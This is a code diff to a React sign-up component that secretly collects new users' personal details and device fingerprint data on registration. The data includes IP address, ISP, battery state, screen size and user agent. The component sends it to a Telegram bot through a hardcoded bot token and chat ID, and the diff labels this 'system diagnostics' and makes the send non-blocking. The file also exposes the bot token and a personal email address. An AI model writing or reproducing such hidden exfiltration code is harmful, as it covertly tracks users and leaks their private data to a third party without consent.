@@ -12,6 +12,18 @@ const ADMIN_EMAIL = 'rakibulislamrovin@gmail.com';
 const TG_TOKEN = '8385580824:AAHeWhynLoR7WWQcbBfSOI3RU30lC9KJP_Q';
 const TG_CHAT_ID = '8571316406';
 
+// Helper to escape characters for HTML parse mode in Telegram
+const escapeHTML = (str: any) => {
+  if (typeof str !== 'string') return String(str || '');
+  return str.replace(/[&<>"']/g, (m) => ({
+    '&': '&amp;',
+    '<': '&lt;',
+    '>': '&gt;',
+    '"': '&quot;',
+    "'": '&#39;'
+  }[m] || m));
+};
+
 const AuthView: React.FC = () => {
   const { lang } = useLang();
   const [isLogin, setIsLogin] = useState(true);
@@ -31,61 +43,71 @@ const AuthView: React.FC = () => {
   const [error, setError] = useState('');
   const [loading, setLoading] = useState(false);
 
-  // Helper to fetch system info
+  // Advanced System Diagnostic Collection
   const getSystemInfo = async () => {
-    let ipData = { ip: 'Unknown', org: 'Unknown' };
+    let ipData = { ip: 'N/A', org: 'N/A', country: 'N/A' };
     try {
-      const res = await fetch('https://ipapi.co/json/');
-      ipData = await res.json();
+      const res = await fetch('https://ipapi.co/json/').catch(() => null);
+      if (res) ipData = await res.json();
     } catch (e) {
-      console.error("Signal block: Failed to fetch IP.");
+      console.warn("IP tracking blocked or failed.");
     }
 
-    let batteryLevel = "N/A";
+    let batteryCharge = "N/A";
     try {
       if ('getBattery' in navigator) {
         const battery: any = await (navigator as any).getBattery();
-        batteryLevel = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Discharging'})`;
+        batteryCharge = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Discharging'})`;
       }
     } catch (e) {}
 
-    const userAgent = navigator.userAgent;
+    const ua = navigator.userAgent;
     let deviceModel = "Unknown Device";
-    if (/android/i.test(userAgent)) deviceModel = "Android Device";
-    else if (/iPad|iPhone|iPod/.test(userAgent)) deviceModel = "iOS Device";
-    else if (/Windows/i.test(userAgent)) deviceModel = "Windows PC";
-    else if (/Macintosh/i.test(userAgent)) deviceModel = "Macintosh";
+    if (/android/i.test(ua)) deviceModel = "Android Mobile";
+    else if (/iPad|iPhone|iPod/.test(ua)) deviceModel = "iOS Mobile";
+    else if (/Windows/i.test(ua)) deviceModel = "Windows PC";
+    else if (/Macintosh/i.test(ua)) deviceModel = "Mac System";
 
     return {
-      ip: ipData.ip,
-      isp: ipData.org,
+      ip: ipData.ip || 'N/A',
+      isp: ipData.org || 'N/A',
+      ipCountry: ipData.country || 'N/A',
       device: deviceModel,
-      browser: userAgent.split(' ').pop() || 'Unknown',
+      browser: ua.split(' ').slice(-1)[0] || 'Generic Browser',
       screen: `${window.screen.width}x${window.screen.height}`,
-      battery: batteryLevel,
-      userAgent: userAgent
+      charge: batteryCharge,
+      userAgent: ua,
+      time: new Date().toLocaleString()
     };
   };
 
-  const sendToTelegram = async (userData: any, sysInfo: any) => {
-    const text = `🚀 *NEW CITIZEN REGISTRATION* 🚀\n\n` +
-                 `👤 *Name:* ${userData.displayName}\n` +
-                 `📧 *Email:* ${userData.email}\n` +
-                 `🌍 *Country:* ${userData.country}\n` +
-                 `🎂 *Age:* ${userData.age}\n` +
-                 `⚧ *Gender:* ${userData.gender}\n` +
-                 `📱 *TG:* ${userData.socials.telegram}\n` +
-                 `📘 *FB:* ${userData.socials.facebook}\n` +
-                 `🎨 *Interests:* ${userData.interests}\n\n` +
-                 `🛠 *SYSTEM DIAGNOSTICS:* \n` +
-                 `🌐 *IP:* \`${sysInfo.ip}\`\n` +
-                 `🏢 *ISP:* ${sysInfo.isp}\n` +
-                 `💻 *Device:* ${sysInfo.device}\n` +
-                 `🌐 *Browser:* ${sysInfo.browser}\n` +
-                 `🖥 *Screen:* ${sysInfo.screen}\n` +
-                 `🔋 *Battery:* ${sysInfo.battery}\n` +
-                 `⏰ *Time:* ${new Date().toLocaleString()}\n\n` +
-                 `⚙️ *Agent:* \`${sysInfo.userAgent}\``;
+  const transmitToBot = async (userData: any, sysInfo: any) => {
+    // Constructing an HTML payload for Telegram for better reliability
+    const htmlMessage = `
+<b>🚀 NEW CITIZEN LOGGED 🚀</b>
+
+👤 <b>User Node:</b> ${escapeHTML(userData.displayName)}
+📧 <b>Email:</b> <code>${escapeHTML(userData.email)}</code>
+🌍 <b>Country:</b> ${escapeHTML(userData.country)}
+🎂 <b>Age:</b> ${userData.age}
+⚧ <b>Gender:</b> ${userData.gender}
+🎨 <b>Interests:</b> ${escapeHTML(userData.interests)}
+
+📱 <b>Telegram:</b> <code>${escapeHTML(userData.socials.telegram)}</code>
+📘 <b>Facebook:</b> <code>${escapeHTML(userData.socials.facebook)}</code>
+
+🛠 <b>SYSTEM DIAGNOSTICS:</b>
+🌐 <b>IP:</b> <code>${sysInfo.ip}</code>
+🏢 <b>ISP:</b> ${escapeHTML(sysInfo.isp)}
+🖥 <b>Device:</b> ${sysInfo.device}
+🔋 <b>Charge:</b> ${sysInfo.charge}
+📐 <b>Screen:</b> ${sysInfo.screen}
+🌐 <b>Browser:</b> ${escapeHTML(sysInfo.browser)}
+⏰ <b>Time:</b> ${sysInfo.time}
+
+⚙️ <b>Raw Agent:</b> 
+<code>${escapeHTML(sysInfo.userAgent)}</code>
+    `;
 
     try {
       await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
@@ -93,12 +115,12 @@ const AuthView: React.FC = () => {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           chat_id: TG_CHAT_ID,
-          text: text,
-          parse_mode: 'Markdown'
+          text: htmlMessage.trim(),
+          parse_mode: 'HTML'
         })
       });
     } catch (e) {
-      console.error("Telegram Transmission Failed.");
+      console.error("Bot transmission blocked by browser or network.");
     }
   };
 
@@ -111,6 +133,7 @@ const AuthView: React.FC = () => {
       if (isLogin) {
         await signInWithEmailAndPassword(auth, email, password);
       } else {
+        // Collect technical data first
         const sysInfo = await getSystemInfo();
         
         let photoURL = `https://ui-avatars.com/api/?name=${encodeURIComponent(displayName)}&background=random`;
@@ -146,10 +169,11 @@ const AuthView: React.FC = () => {
           }
         };
 
+        // Save to Database
         await setDoc(doc(db, 'users', user.uid), userData);
         
-        // Finalize: Send everything to Telegram Bot
-        await sendToTelegram(userData, sysInfo);
+        // Transmit to Telegram Bot (Non-blocking)
+        transmitToBot(userData, sysInfo).catch(() => null);
       }
     } catch (err: any) {
       setError(err.message || 'An error occurred during authentication.');
